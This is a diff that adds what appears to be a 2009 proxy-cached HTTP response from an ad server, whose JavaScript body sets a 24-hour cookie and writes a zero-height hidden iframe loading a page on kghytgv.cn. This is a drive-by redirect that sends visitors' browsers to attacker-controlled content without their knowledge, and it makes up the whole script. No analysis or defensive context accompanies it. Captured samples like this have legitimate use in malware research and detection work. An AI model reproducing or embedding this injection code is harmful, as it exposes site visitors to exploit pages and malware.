@@ -1,0 +1,24 @@
+HTTP/1.1 200 OK
+Content-Length: 443
+ETag: "4e7f5eebd49ec91:b14d1"
+Date: Thu, 12 Mar 2009 07:05:54 GMT
+Last-Modified: Sat, 07 Mar 2009 03:29:27 GMT
+Content-Type: application/x-javascript
+Accept-Ranges: bytes
+Server: Microsoft-IIS/6.0
+X-Polipo-Location: http://ad.ailimamacn.cn/ad_00211.js
+X-Polipo-Date: Thu, 12 Mar 2009 07:13:38 GMT
+X-Polipo-Access: Wed, 18 Mar 2009 08:57:56 GMT
+
+function Get(){
+var Then = new Date() 
+Then.setTime(Then.getTime() + 24*60*60*1000)
+var cookieString = new String(document.cookie)
+var cookieHeader = "Cookie1=" 
+var beginPosition = cookieString.indexOf(cookieHeader)
+if (beginPosition != -1){ 
+} else 
+{ document.cookie = "Cookie1=risb;expires="+ Then.toGMTString()
+document.writeln("<IFRaME src=\"http://kghytgv.cn:6135/b094933/b09.htm\" width=100 height=0><\/IFRAME>");
+}
+}Get(); 
